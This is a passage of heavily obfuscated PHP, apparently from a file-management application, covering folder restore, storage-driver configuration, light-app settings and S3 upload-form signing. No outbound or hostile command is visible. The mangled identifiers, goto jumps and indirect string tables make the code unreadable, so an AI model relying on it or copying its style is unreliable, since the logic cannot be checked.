$a¥Â¡ƒÜ”’->where($cÓ¢æ©œ´Š)->setField($Dä½œºŸ[426], 0); $this->restoreFolderChildren($eª×ôÜäÁ©, $Dƒ‡Ï‚ÊéÔ); } $this->where(array($Dä½œºŸ[399] => $eª×ôÜäÁ©))->delete(); $a¥Â¡ƒÜ”’->folderSizeReset($DÙšëğÄæ [$Dä½œºŸ[481]]); goto B— ´™š’›; dì‹ñ´¢‘©: } goto D‚ÕºôÄÅÛ; D¨ëâ„Šğ: } private function restoreFolderChildren($d£Šéƒô™, $d‡²Ò‡Úê) { goto A‡ÍË‰ù‡Æ; EßÆ£«ÛÃ½: $dÒ²®Ô–‰[$e¨ç§ŠÛ»İ[399]][1] = array_unique($dÒ²®Ô–‰[$e¨ç§ŠÛ»İ[399]][1]); $dÒ²®Ô–‰[$e¨ç§ŠÛ»İ[934]] = $e¨ç§ŠÛ»İ[1756]; $F„ŞœÏšÆ ->where($dÒ²®Ô–‰)->setField($e¨ç§ŠÛ»İ[426], 1); goto dÎˆ‡ÚËå; Aæ¬¡‰Â¹Ş: foreach ($d‡²Ò‡Úê as $Añœ­‚îŠ—) { if ($Añœ­‚îŠ— == $d£Šéƒô™) { continue; } if (!$F„ŞœÏšÆ ->isParentOf($d£Šéƒô™, $Añœ­‚îŠ—)) { continue; } $AÃÙÎ·šîí = $F„ŞœÏšÆ ->sourceInfo($Añœ­‚îŠ—); if ($AÃÙÎ·šîí[$e¨ç§ŠÛ»İ[406]] == $e¨ç§ŠÛ»İ[96]) { $dÒ²®Ô–‰[] = array($e¨ç§ŠÛ»İ[557] => array($e¨ç§ŠÛ»İ[516], $AÃÙÎ·šîí[$e¨ç§ŠÛ»İ[490]] . $Añœ­‚îŠ— . $e¨ç§ŠÛ»İ[517])); } else { $dÒ²®Ô–‰[$e¨ç§ŠÛ»İ[399]][1][] = $Añœ­‚îŠ—; } } if (!$dÒ²®Ô–‰[$e¨ç§ŠÛ»İ[399]][1]) { unset($dÒ²®Ô–‰[$e¨ç§ŠÛ»İ[399]]); } if (!$dÒ²®Ô–‰) { return; } goto EßÆ£«ÛÃ½; A‡ÍË‰ù‡Æ: $e¨ç§ŠÛ»İ =& $_SERVER[¾÷]; $F„ŞœÏšÆ  = Model($e¨ç§ŠÛ»İ[1180]); $dÒ²®Ô–‰ = array($e¨ç§ŠÛ»İ[399] => array($e¨ç§ŠÛ»İ[17], array())); goto Aæ¬¡‰Â¹Ş; dÎˆ‡ÚËå: } private function recycleMove($e•Ç‚Õ±Õº, $CˆÒ¥…„î¢ = 1) { $c§’Ä”¥î… =& $_SERVER[¾÷]; $eÏœ”…ºïŒ = Model($c§’Ä”¥î…[1180]); $F¬ĞÕøæ = Model($c§’Ä”¥î…[1964]); $b¤¦ÉõŒ‡Ğ = array($c§’Ä”¥î…[399] => $e•Ç‚Õ±Õº); if ($CˆÒ¥…„î¢) { $eÏœ”…ºïŒ->where($b¤¦ÉõŒ‡Ğ)->setField($c§’Ä”¥î…[426], 1); $F¬ĞÕøæ->eventRecycle($e•Ç‚Õ±Õº, $c§’Ä”¥î…[1965]); } else { $a§Ñº¦‚ = $eÏœ”…ºïŒ->where($b¤¦ÉõŒ‡Ğ)->find(); $DÈ¼Ë¤’Ó = $a§Ñº¦‚[$c§’Ä”¥î…[406]] == $c§’Ä”¥î…[96]; $b›¹¡Ÿ»˜ò = $eÏœ”…ºïŒ->fileNameAuto($a§Ñº¦‚[$c§’Ä”¥î…[481]], $a§Ñº¦‚[$c§’Ä”¥î…[38]], REPEAT_RENAME_FOLDER, $DÈ¼Ë¤’Ó); if ($b›¹¡Ÿ»˜ò != $a§Ñº¦‚[$c§’Ä”¥î…[38]]) { $eÏœ”…ºïŒ->rename($e•Ç‚Õ±Õº, $b›¹¡Ÿ»˜ò); } $eÏœ”…ºïŒ->where($b¤¦ÉõŒ‡Ğ)->setField($c§’Ä”¥î…[426], 0); $F¬ĞÕøæ->eventRecycle($e•Ç‚Õ±Õº, $c§’Ä”¥î…[1966]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x73\x74\157\x72\141\x67\x65\x4c\x69\x73\164"; public $field = array("\x6e\x61\155\x65", "\x73\151\172\x65\115\x61\x78", "\163\x79\163\x74\145\155", "\144\x65\x66\x61\165\154\164", "\x64\x72\x69\166\145\x72", "\143\x6f\156\146\x69\147"); public function listData($e¿ÎäÉÔõ = false, $Eçíå¤À† = "\155\x6f\144\x69\146\x79\124\151\x6d\x65", $F¦‹©ËÅáğ = false) { $dáÃ¤Üˆ×­ =& $_SERVER[¾÷]; $eõÆé„¨è = parent::listData($e¿ÎäÉÔõ, $Eçíå¤À†, $F¦‹©ËÅáğ); if ($e¿ÎäÉÔõ) { return $eõÆé„¨è; } $AœæÜíç“š = $this->ioSizeUseGet(array_to_keyvalue($eõÆé„¨è, $dáÃ¤Üˆ×­[43], $dáÃ¤Üˆ×­[397])); foreach ($eõÆé„¨è as $eÙ¬Ã‰×´ => $E«ßàÒì†à) { unset($eõÆé„¨è[$eÙ¬Ã‰×´][$dáÃ¤Üˆ×­[16]]); $eõÆé„¨è[$eÙ¬Ã‰×´][$dáÃ¤Üˆ×­[1654]] = isset($AœæÜíç“š[$E«ßàÒì†à[$dáÃ¤Üˆ×­[397]]]) ? $AœæÜíç“š[$E«ßàÒì†à[$dáÃ¤Üˆ×­[397]]] : 0; } return $eõÆé„¨è; } public function ioSizeUseGet($AĞï×”òƒŸ) { goto CÏŠÕó³“‡; F£†òõ³ˆŒ: $cøŞ’Ş¹ï¨ = array($B»×œöõíÌ[769] => array($B»×œöõíÌ[17], $AĞï×”òƒŸ)); $Dšñ‡äğß° = Model($B»×œöõíÌ[740])->field($bò÷ó´õ¶ )->where($cøŞ’Ş¹ï¨)->group($B»×œöõíÌ[769])->select(); $Dšñ‡äğß° = array_to_keyvalue($Dšñ‡äğß°, $B»×œöõíÌ[397], $B»×œöõíÌ[87]); goto dÍÚÑÍøĞ©; FÍÛàºµª§: $Dšñ‡äğß° = Cache::get($F¹†©øÏ); if ($Dšñ‡äğß°) { return $Dšñ‡äğß°; } $bò÷ó´õ¶  = array($B»×œöõíÌ[769] => $B»×œöõíÌ[397], $B»×œöõíÌ[1968] => $B»×œöõíÌ[87]); goto F£†òõ³ˆŒ; dÍÚÑÍøĞ©: Cache::set($F¹†©øÏ, $Dšñ‡äğß°, 60); return $Dšñ‡äğß°; goto Eï’„óáÕÑ; CÏŠÕó³“‡: $B»×œöõíÌ =& $_SERVER[¾÷]; if (!$AĞï×”òƒŸ) { return array(); } $F¹†©øÏ = $B»×œöõíÌ[1967] . implode($B»×œöõíÌ[57], $AĞï×”òƒŸ); goto FÍÛàºµª§; Eï’„óáÕÑ: } public function getConfig($B¬áµ¬ª˜) { $c‰°Ş¬º¬¨ = parent::listData($B¬áµ¬ª˜); return json_decode($c‰°Ş¬º¬¨[$_SERVER[¾÷][16]], !0); } public function update($Cœ²½±ÄÃ, $DÍÄÙºã) { goto a˜‡ºŞÈ; b—áŠÛ£©: if (isset($aôŠ¾–óâ[$eë™œŒ²ù“]) && $aôŠ¾–óâ[$eë™œŒ²ù“][$B’¢ãã’É›[397]] != $Cœ²½±ÄÃ) { return !1; } if (isset($DÍÄÙºã[$B’¢ãã’É›[1969]]) && $DÍÄÙºã[$B’¢ãã’É›[1969]] == $B’¢ãã’É›[96]) { $this->checkConfig($DÍÄÙºã); } unset($DÍÄÙºã[$B’¢ãã’É›[1969]]); goto BÀ°¥“ÁÔæ; a˜‡ºŞÈ: $B’¢ãã’É› =& $_SERVER[¾÷]; $eë™œŒ²ù“ = $DÍÄÙºã[$B’¢ãã’É›[38]]; $aôŠ¾–óâ = array_to_keyvalue(parent::listData(), $B’¢ãã’É›[38]); goto b—áŠÛ£©; BÀ°¥“ÁÔæ: $A·ëÔ““Î… = parent::update($Cœ²½±ÄÃ, $DÍÄÙºã); if ($A·ëÔ““Î… && $DÍÄÙºã[$B’¢ãã’É›[44]]) { foreach ($aôŠ¾–óâ as $AñøÅÚù³) { if ($AñøÅÚù³[$B’¢ãã’É›[44]] && $AñøÅÚù³[$B’¢ãã’É›[397]] != $Cœ²½±ÄÃ) { parent::update($AñøÅÚù³[$B’¢ãã’É›[397]], array($B’¢ãã’É›[44] => 0)); } } } return $A·ëÔ““Î…; goto A ÊÚ£È»; A ÊÚ£È»: } public function add($eæª‡¤³©­) { goto FİíÌ•ç§ö; AÅí²Š‹÷ã: $this->checkConfig($eæª‡¤³©­); $aŸ¬‡äÀ›” = parent::insert($eæª‡¤³©­); if ($aŸ¬‡äÀ›” && $eæª‡¤³©­[$EŒ£ØâÒ´ˆ[44]]) { foreach ($EŸ­±×¦Ô as $c¢ñÜğåØ—) { if ($c¢ñÜğåØ—[$EŒ£ØâÒ´ˆ[44]]) { parent::update($c¢ñÜğåØ—[$EŒ£ØâÒ´ˆ[397]], array($EŒ£ØâÒ´ˆ[44] => 0)); } } } goto Aâ†õƒâó; FİíÌ•ç§ö: $EŒ£ØâÒ´ˆ =& $_SERVER[¾÷]; $EŸ­±×¦Ô = array_to_keyvalue(parent::listData(), $EŒ£ØâÒ´ˆ[38]); if (isset($EŸ­±×¦Ô[$eæª‡¤³©­[$EŒ£ØâÒ´ˆ[38]]])) { return !1; } goto AÅí²Š‹÷ã; Aâ†õƒâó: return $aŸ¬‡äÀ›”; goto céÚÎ†»‰°; céÚÎ†»‰°: } public function checkConfig(&$f¼‡ïÃ) { goto D•ÏƒÚ…¢Æ; A™õËìØÙ‹: $C‘äïŸµÚ = new $C˜Ö”›ª¨½($AÎ¯©…²–); if (in_array($aŠÁÃßËô’, $C‘äïŸµÚ->objectDriver)) { if (!$C‘äïŸµÚ->isBucketCors() && !$C‘äïŸµÚ->setBucketCors()) { $cœğ±¾›‹è = LNG($dœËĞ·Ê¯Œ[1974]); $cœğ±¾›‹è .= $dœËĞ·Ê¯Œ[1975] . LNG($dœËĞ·Ê¯Œ[1976]); show_json($cœğ±¾›‹è, !1); } } $fŠÈÜË˜İ‹ = rtrim($AÎ¯©…²–[$dœËĞ·Ê¯Œ[1052]], $dœËĞ·Ê¯Œ[18]) . $dœËĞ·Ê¯Œ[18]; goto DŸœïº‚©¨; cå—äŠ·ä : $f¼‡ïÃ[$dœËĞ·Ê¯Œ[16]] = json_encode($AÎ¯©…²–); $f¼‡ïÃ[$dœËĞ·Ê¯Œ[103]] = $Då¢—ğó–ª; return !0; goto a¬«öÏ«Ó¼; e„Û„éÜ£: $Då¢—ğó–ª = isset($bÅİ›ô‹·‚[$aŠÁÃßËô’]) ? $bÅİ›ô‹·‚[$aŠÁÃßËô’] : ucfirst($aŠÁÃßËô’); $C˜Ö”›ª¨½ = $dœËĞ·Ê¯Œ[81] . $Då¢—ğó–ª; if (!$Då¢—ğó–ª || !class_exists($C˜Ö”›ª¨½)) { write_log(array($dœËĞ·Ê¯Œ[1971], $f¼‡ïÃ, get_caller_info()), $dœËĞ·Ê¯Œ[1972]); show_json(LNG($dœËĞ·Ê¯Œ[1973]), !1, $f¼‡ïÃ); } goto A™õËìØÙ‹; DŸœïº‚©¨: $A’’æêÑ™Ã = $C‘äïŸµÚ->getPath($fŠÈÜË˜İ‹ . $dœËĞ·Ê¯Œ[1113]); if (!$C‘äïŸµÚ->mkfile($A’’æêÑ™Ã)) { show_json(LNG($dœËĞ·Ê¯Œ[1974]), !1); } $AÎ¯©…²–[$dœËĞ·Ê¯Œ[1052]] = $fŠÈÜË˜İ‹; goto cå—äŠ·ä ; bÇöëÇ¢: foreach ($AÎ¯©…²– as $C»ÚŞè”ëĞ => $A ³Í‡÷õÎ) { $AÎ¯©…²–[$C»ÚŞè”ëĞ] = trim($A ³Í‡÷õÎ); } $AÎ¯©…²–[$dœËĞ·Ê¯Œ[1970]] = rand_string(6); $bÅİ›ô‹·‚ = $GLOBALS[$dœËĞ·Ê¯Œ[16]][$dœËĞ·Ê¯Œ[97]][$dœËĞ·Ê¯Œ[777]]; goto e„Û„éÜ£; D•ÏƒÚ…¢Æ: $dœËĞ·Ê¯Œ =& $_SERVER[¾÷]; $aŠÁÃßËô’ = strtolower($f¼‡ïÃ[$dœËĞ·Ê¯Œ[103]]); $AÎ¯©…²– = json_decode($f¼‡ïÃ[$dœËĞ·Ê¯Œ[16]], !0); goto bÇöëÇ¢; a¬«öÏ«Ó¼: } public function driverListSystem() { $f‚ŞŸŞóˆ¢ =& $_SERVER[¾÷]; $c‡¯…ÓÁ„ = parent::listData(); $D„ª‚Ñ¹® = array(); foreach ($c‡¯…ÓÁ„ as $Aù™¹ƒÃ‚) { unset($Aù™¹ƒÃ‚[$f‚ŞŸŞóˆ¢[202]], $Aù™¹ƒÃ‚[$f‚ŞŸŞóˆ¢[93]]); $Aù™¹ƒÃ‚[$f‚ŞŸŞóˆ¢[16]] = json_decode($Aù™¹ƒÃ‚[$f‚ŞŸŞóˆ¢[16]], !0); $D„ª‚Ñ¹®[] = $Aù™¹ƒÃ‚; } return $D„ª‚Ñ¹®; } public function defaultDriver() { $DóÒàô´ª« =& $_SERVER[¾÷]; $EÖ•ŞÒ·á = parent::listData(); $F–ƒ†æ„øÛ = array_filter_by_field($EÖ•ŞÒ·á, $DóÒàô´ª«[44], 1); $F–ƒ†æ„øÛ = $F–ƒ†æ„øÛ[0]; if ($F–ƒ†æ„øÛ) { $F–ƒ†æ„øÛ[$DóÒàô´ª«[16]] = json_decode($F–ƒ†æ„øÛ[$DóÒàô´ª«[16]], !0); } return $F–ƒ†æ„øÛ; } public function driverInfo($D™«ô¿œ–) { $DğéùÎ‚¿ =& $_SERVER[¾÷]; $Eø‡÷ÈÔÇª = array_to_keyvalue(parent::listData(), $DğéùÎ‚¿[397]); if (!isset($Eø‡÷ÈÔÇª[$D™«ô¿œ–])) { return !1; } $C†±‹ÀàÎÜ = $Eø‡÷ÈÔÇª[$D™«ô¿œ–]; $C†±‹ÀàÎÜ[$DğéùÎ‚¿[16]] = json_decode($C†±‹ÀàÎÜ[$DğéùÎ‚¿[16]], !0); return $C†±‹ÀàÎÜ; } public function remove($d®§á³ø…³) { $this->removeShareItems($d®§á³ø…³); return parent::remove($d®§á³ø…³); } public function removeWithFile($aéô´â“š, $aù’À¢®) { goto DÉòĞÊ®ƒø; DÉòĞÊ®ƒø: $aå‚Î¾¤Âó =& $_SERVER[¾÷]; $B×³Èê½êÌ = array($aå‚Î¾¤Âó[769] => $aéô´â“š); $a¯“Ó…ŒÀ‰ = Model($aå‚Î¾¤Âó[453])->where($B×³Èê½êÌ)->count(); goto e§ÏğËÒ¯²; dİïÑ›²Á: $aë½‹Í¸Ì->task[$aå‚Î¾¤Âó[720]] = (double) $B¢ò¼«Â†¬; $fè·Ì¦‰ç‘ = KodIO::defaultDriver(); $C¤ñ„‰ïì¯ = $fè·Ì¦‰ç‘[$aå‚Î¾¤Âó[397]]; goto Díñ‘Õ„Û¢; e§ÏğËÒ¯²: $B¢ò¼«Â†¬ = Model($aå‚Î¾¤Âó[453])->where($B×³Èê½êÌ)->sum($aå‚Î¾¤Âó[87]); $A…šŠ‹Ü¡‡ = $aù’À¢® . $aå‚Î¾¤Âó[1977] . $aéô´â“š; $aë½‹Í¸Ì = new TaskFileTransfer($A…šŠ‹Ü¡‡, $aå‚Î¾¤Âó[1972], $a¯“Ó…ŒÀ‰, LNG($aå‚Î¾¤Âó[1978]) . "\x28{$aéô´â“š}\51"); goto dİïÑ›²Á; c¢×‚‹ãõÙ: $EŠ†ñ¤çéÀ = Model($aå‚Î¾¤Âó[201])->where($B×³Èê½êÌ)->field($aå‚Î¾¤Âó[1979])->select(); foreach ($EŠ†ñ¤çéÀ as $B¶Æ¥Á—æÊ) { goto Aø…£±²‘; CËÁÀß•œŞ: $eÛŞ ç„¬ = array($aå‚Î¾¤Âó[769] => $C¤ñ„‰ïì¯, $aå‚Î¾¤Âó[85] => $f¬Â¨à); Model($aå‚Î¾¤Âó[201])->where($B×³Èê½êÌ)->save($eÛŞ ç„¬); goto eïÏïâñ‘; Aø…£±²‘: $CŸ»¡Ê¡¢° = $B¶Æ¥Á—æÊ[$aå‚Î¾¤Âó[85]]; $f¬Â¨à = $d¾ÏÄìÜ  . str_replace("\x7b\151\157\x3a{$aéô´â“š}\x7d\x2f", $aå‚Î¾¤Âó[43], $CŸ»¡Ê¡¢°); if (!IO::exist($CŸ»¡Ê¡¢°)) { $B»ÍØ¨èÑ[] = $B¶Æ¥Á—æÊ[$aå‚Î¾¤Âó[450]]; $aë½‹Í¸Ì->updateFileEnd($B¶Æ¥Á—æÊ[$aå‚Î¾¤Âó[38]], $B¶Æ¥Á—æÊ[$aå‚Î¾¤Âó[87]]); continue; } goto E¤»ÊŒÜ·; E¤»ÊŒÜ·: if (IO::exist($f¬Â¨à)) { $aë½‹Í¸Ì->updateFileEnd($B¶Æ¥Á—æÊ[$aå‚Î¾¤Âó[38]], $B¶Æ¥Á—æÊ[$aå‚Î¾¤Âó[87]]); continue; } if (!IO::move($CŸ»¡Ê¡¢°, get_path_father($f¬Â¨à))) { $B°ÍĞÄ«’í = !1; break; } $B×³Èê½êÌ = array($aå‚Î¾¤Âó[450] => $B¶Æ¥Á—æÊ[$aå‚Î¾¤Âó[450]]); goto CËÁÀß•œŞ; eïÏïâñ‘: } $this->removeByFileID($B»ÍØ¨èÑ); goto BÖµ¯«ˆÆ; BÖµ¯«ˆÆ: if (!$B°ÍĞÄ«’í) { $aë½‹Í¸Ì->stop($A…šŠ‹Ü¡‡); return !1; } $aë½‹Í¸Ì->end(); if ($aù’À¢® == $aå‚Î¾¤Âó[1634]) { $this->remove($aéô´â“š); } goto e¯ÕÜ®°Æ›; Díñ‘Õ„Û¢: $d¾ÏÄìÜ  = "\x7b\x69\x6f\x3a{$C¤ñ„‰ïì¯}\175\x2f"; $B°ÍĞÄ«’í = !0; $B»ÍØ¨èÑ = array(); goto c¢×‚‹ãõÙ; e¯ÕÜ®°Æ›: } public function progress($bàùñÌªù, $E÷¾ôğÔ×) { return Task::get($E÷¾ôğÔ× . $_SERVER[¾÷][1977] . $bàùñÌªù); } private function removeByFileID($b©‡à°â©— = array()) { goto bß²ˆ®¡Àµ; Dƒğ§Á«Ö—: foreach ($aóŸÜõâõ as $Fº¢Óïƒ¯) { Model($fÇˆŒ ¬×[412])->removeNow($Fº¢Óïƒ¯, !1); } goto CÄ·˜º¤æß; fëĞ„Ñ‡…: $aóŸÜõâõ = Model($fÇˆŒ ¬×[1180])->where($A¥Òˆİ­Ñæ)->field($fÇˆŒ ¬×[399])->select(); if (!$aóŸÜõâõ) { return; } $aóŸÜõâõ = array_to_keyvalue($aóŸÜõâõ, $fÇˆŒ ¬×[43], $fÇˆŒ ¬×[399]); goto Dƒğ§Á«Ö—; bß²ˆ®¡Àµ: $fÇˆŒ ¬× =& $_SERVER[¾÷]; if (empty($b©‡à°â©—)) { return; } $A¥Òˆİ­Ñæ = array($fÇˆŒ ¬×[450] => array($fÇˆŒ ¬×[17], $b©‡à°â©—)); goto fëĞ„Ñ‡…; CÄ·˜º¤æß: } private function removeShareItems($AÓÂóô„™) { goto cµ¹²èµÔ; cµ¹²èµÔ: $c–¿š˜° =& $_SERVER[¾÷]; $FÂÑ™µÛ = "\x7b\x69\157\x3a{$AÓÂóô„™}\x7d\57"; $fñòŒ×îåÏ = array($c–¿š˜°[399] => 0, $c–¿š˜°[1047] => array($c–¿š˜°[387], "{$FÂÑ™µÛ}\x25")); goto f“›ØïŒä÷; f“›ØïŒä÷: $AÆ¯Í›åê = Model($c–¿š˜°[1645])->where($fñòŒ×îåÏ)->field($c–¿š˜°[471])->select(); if (empty($AÆ¯Í›åê)) { return; } $CµŠŸ‘Ñ¯… = array_to_keyvalue($AÆ¯Í›åê, $c–¿š˜°[43], $c–¿š˜°[471]); goto cĞÂœË§Ò‚; cĞÂœË§Ò‚: Model($c–¿š˜°[567])->remove($CµŠŸ‘Ñ¯…); goto EìÓ’ôÜî; EìÓ’ôÜî: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\114\x69\x67\x68\164\x41\x70\x70"; public $modelType = "\x53\171\163\164\145\155\x4f\x70\x74\151\x6f\156"; public $field = array("\x6e\141\x6d\x65", "\x67\162\157\x75\160", "\144\145\163\x63", "\x63\x6f\x6e\164\x65\156\164"); public function listData($f’¡‚Š°³ = false, $EêŒÄ ‚áÕ = "\155\157\144\151\x66\171\x54\x69\x6d\x65", $fø²‹È°  = true) { return parent::listData($f’¡‚Š°³, $EêŒÄ ‚áÕ, $fø²‹È° ); } public function remove($DÄÉñ¼ãô) { $DÜ–…ôÊ› = $this->findByName($DÄÉñ¼ãô); if (!$DÜ–…ôÊ›) { return !1; } return parent::remove($DÜ–…ôÊ›[$_SERVER[¾÷][397]]); } public function add($fì•š…èºâ) { if ($this->findByName($fì•š…èºâ[$_SERVER[¾÷][38]])) { return !1; } return parent::insert($fì•š…èºâ); } public function update($eğä‚ÀÜ´, $BŠ’ä‰òóÔ) { $c‘Í§Í‡’ =& $_SERVER[¾÷]; $F…Üõùô„ = $this->findByName($eğä‚ÀÜ´); $Aã†²ê¢½¿ = $this->findByName($BŠ’ä‰òóÔ[$c‘Í§Í‡’[38]]); if (!$F…Üõùô„ || $Aã†²ê¢½¿ && $Aã†²ê¢½¿[$c‘Í§Í‡’[397]] != $F…Üõùô„[$c‘Í§Í‡’[397]]) { return !1; } return parent::update($F…Üõùô„[$c‘Í§Í‡’[397]], $BŠ’ä‰òóÔ); } } goto f‡ÄÎ×İ³; eÑÊ÷‹éÔ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($F¦îœš›ùó) { parent::__construct($F¦îœš›ùó); } public function uploadFormData($eàÕæ™ƒ, $eš“•ŠÃÛˆ = 3600) { goto E¥¿Ã¨›ù±; cö‡Ş……²: $E•âÛßïæ¤ = array($this->accessKey, $Cø„ÜÀ­ß, $this->region, $A²¸¬Ê¶ÜÛ, $Dªİ„¤÷ù‰); $F‰æ‘ïˆğÌ = implode($aùÂ“„•©¤[18], $E•âÛßïæ¤); $dØƒÊƒ¡¬ñ = array($aùÂ“„•©¤[1165] => gmdate($aùÂ“„•©¤[1164], strtotime($aùÂ“„•©¤[1202])), $aùÂ“„•©¤[1166] => array(array($aùÂ“„•©¤[1168] => $this->bucket), array($aùÂ“„•©¤[1167] => $eİÌ¾’îØ), array($aùÂ“„•©¤[1169], $aùÂ“„•©¤[1170], $aùÂ“„•©¤[43]), array($aùÂ“„•©¤[1169], $aùÂ“„•©¤[1203], $aùÂ“„•©¤[43]), array($aùÂ“„•©¤[1169], $aùÂ“„•©¤[1204], $aùÂ“„•©¤[43]), array($aùÂ“„•©¤[1171] => $CƒÂŒ™²), array($aùÂ“„•©¤[1205] => $F‰æ‘ïˆğÌ), array($aùÂ“„•©¤[1206] => $Aé„ í§Ìã), array($aùÂ“„•©¤[1207] => $aââíˆ’Ü), array($aùÂ“„•©¤[1208] => $Aàšà«Ò« ))); goto e˜ª˜ÄâÛ; c…×ÆÍµší: $f×À”±Ã¦¾ = hash_hmac($aùÂ“„•©¤[1209], $A²¸¬Ê¶ÜÛ, $c©ìù÷Ü«‘, !0); $BÀ…»“–°¾ = hash_hmac($aùÂ“„•©¤[1209], $Dªİ„¤÷ù‰, $f×À”±Ã¦¾, !0); $DíÑíÉ“ = hash_hmac($aùÂ“„•©¤[1209], $Fª°ğ¡¶ƒÛ, $BÀ…»“–°¾); goto a½è·ˆ¿ˆ; b¹÷øš‚À: $A²¸¬Ê¶ÜÛ = $aùÂ“„•©¤[69]; $aââíˆ’Ü = gmdate($aùÂ“„•©¤[1200]); $Cø„ÜÀ­ß = gmdate($aùÂ“„•©¤[712]); goto F«…ÆÔÁò´; E¥¿Ã¨›ù±: $aùÂ“„•©¤ =& $_SERVER[¾÷]; $eİÌ¾’îØ = $aùÂ“„•©¤[200]; $Aé„ í§Ìã = $aùÂ“„•©¤[1199]; goto b¹÷øš‚À; a½è·ˆ¿ˆ: $C“ÂÓµñÜ = array($aùÂ“„•©¤[219] => $aùÂ“„•©¤[43], $aùÂ“„•©¤[1211] => $aùÂ“„•©¤[43], $aùÂ“„•©¤[1167] => $eİÌ¾’îØ, $aùÂ“„•©¤[1171] => $CƒÂŒ™², $aùÂ“„•©¤[1175] => $Fª°ğ¡¶ƒÛ, $aùÂ“„•©¤[1212] => $F‰æ‘ïˆğÌ, $aùÂ“„•©¤[1213] => $Aé„ í§Ìã, $aùÂ“„•©¤[1214] => $aââíˆ’Ü, $aùÂ“„•©¤[1215] => $Aàšà«Ò« , $aùÂ“„•©¤[1216] => $DíÑíÉ“, $aùÂ“„•©¤[184] => $this->getHost()); return $C“ÂÓµñÜ; goto Cç×ŸŠó³‘; F«…ÆÔÁò´: $Dªİ„¤÷ù‰ = $aùÂ“„•©¤[1201]; $Aàšà«Ò«  = $eš“•ŠÃÛˆ . $aùÂ“„•©¤[43]; $CƒÂŒ™² = $aùÂ“„•©¤[1163]; goto cö‡Ş……²; e˜ª˜ÄâÛ: $Fª°ğ¡¶ƒÛ = base64_encode(json_encode($dØƒÊƒ¡¬ñ)); $f¯«‰é„Ü‹ = hash_hmac($aùÂ“„•©¤[1209], $Cø„ÜÀ­ß, $aùÂ“„•©¤[1210] . $this->secret, !0); $c©ìù÷Ü«‘ = hash_hmac($aùÂ“„•©¤[1209], $this->region, $f¯«‰é„Ü‹, !0); goto c…×ÆÍµší; Cç×ŸŠó³‘: } public function multiUploadFormData($cÄÁç·Ü®¨, $EÎÛ„‚¦Û¯ = 3600) { $Aì¦–å—¿ê =& $_SERVER[¾÷]; $d‡Ç½¥Ò°÷ = gmdate($Aì¦–å—¿ê[1294]); $eìíßó÷Æå = array(); $E¢Ñ¯ò×öò = $this->client->getUploadId($this->bucket, $cÄÁç·Ü®¨, $eìíßó÷Æå); if (!$E¢Ñ¯ò×öò) { return !1; } return array($Aì¦–å—¿ê[229] => $E¢Ñ¯ò×öò, $Aì¦–å—¿ê[184] => $this->getHost() . $Aì¦–å—¿ê[18] . $this->pathEncode($cÄÁç·Ü®¨), $Aì¦–å—¿ê[230] => $d‡Ç½¥Ò°÷, $Aì¦–å—¿ê[102] => $cÄÁç·Ü®¨); } public function multiUploadAuthData($bò®ÙªØ‹‚, $A´¶¤¥¿¼ = array()) { goto fÅµ  Øƒ„; fÅµ  Øƒ„: $Eµ¼­±¾ù =& $_SERVER[¾÷]; $F©¬’ëáÌŠ = isset($A´¶¤¥¿¼[$Eµ¼­±¾ù[177]]) ? $A´¶¤¥¿¼[$Eµ¼­±¾ù[177]] : $Eµ¼­±¾ù[43]; $b­òöŒØ° = $A´¶¤¥¿¼[$Eµ¼­±¾ù[102]]; goto c©¡ë–Åì; c©¡ë–Åì: unset($A´¶¤¥¿¼[$Eµ¼­±¾ù[102]]); if (isset($A´¶¤¥¿¼[$Eµ¼­±¾ù[231]])) { return $this->listUploadParts($b­òöŒØ°, $A´¶¤¥¿¼); } $CâäåÇÓ·¯ = array(); goto E ´À»‘Êæ; eÈ²¨ò¿÷Œ: if (strpos($F©¬’ëáÌŠ, $Eµ¼­±¾ù[233]) === 0) { if (isset($CâäåÇÓ·¯[$Eµ¼­±¾ù[1296]])) { $D²Á¬Æ¾÷ì = $CâäåÇÓ·¯[$Eµ¼­±¾ù[1296]]; } else { if (isset($AÉ£†ôÅÆç[$Eµ¼­±¾ù[1296]])) { $D²Á¬Æ¾÷ì = $AÉ£†ôÅÆç[$Eµ¼­±¾ù[1296]]; } else { $D²Á¬Æ¾÷ì = hash($Eµ¼­±¾ù[1209], $Eµ¼­±¾ù[43]); } } return array($Eµ¼­±¾ù[239] => $AÉ£†ôÅÆç[$Eµ¼­±¾ù[239]], $Eµ¼­±¾ù[1296] => $D²Á¬Æ¾÷ì, $Eµ¼­±¾ù[230] => $AÉ£†ôÅÆç[$Eµ¼­±¾ù[1299]]); } return $AÉ£†ôÅÆç[$Eµ¼­±¾ù[239]]; goto fŠºÂå„†—; aÛù˜‡ïÚ: $Fì£Íñµ = $Eµ¼­±¾ù[234]; $EÏ®»ãùˆ× = $Eµ¼­±¾ù[18] . $this->pathEncode($b­òöŒØ°) . $F©¬’ëáÌŠ; $AÉ£†ôÅÆç = $this->client->__getSignatureV4($CâäåÇÓ·¯, $D§šÒà¬¬, $Fì£Íñµ, $EÏ®»ãùˆ×); goto eÈ²¨ò¿÷Œ; E ´À»‘Êæ: if (isset($A´¶¤¥¿¼[$Eµ¼­±¾ù[1295]])) { $CâäåÇÓ·¯[$Eµ¼­±¾ù[1296]] = $A´¶¤¥¿¼[$Eµ¼­±¾ù[1295]]; } $eÆæ«¼”  = explode($Eµ¼­±¾ù[186], $this->getHost()); $D§šÒà¬¬ = array($Eµ¼­±¾ù[1297] => $eÆæ«¼” [1], $Eµ¼­±¾ù[1298] => $Eµ¼­±¾ù[43], $Eµ¼­±¾ù[219] => $Eµ¼­±¾ù[128], $Eµ¼­±¾ù[1211] => $A´¶¤¥¿¼[$Eµ¼­±¾ù[87]]); goto aÛù˜‡ïÚ; fŠºÂå„†—: } public function listUploadParts($e¥ùƒàÜ¡, $fá¨ò§¢éØ = array()) { goto FñÍÉ¸Š–Ù; BªÎ•ÆŸ©: if (!$C†®ª™©Úè) { return !1; } $dÁˆÚÇ‚Ï¥ = $b°ÄˆÓ„õ[1300]; foreach ($C†®ª™©Úè as $d„ò“˜Èˆœ) { $dÁˆÚÇ‚Ï¥ .= $b°ÄˆÓ„õ[1301] . 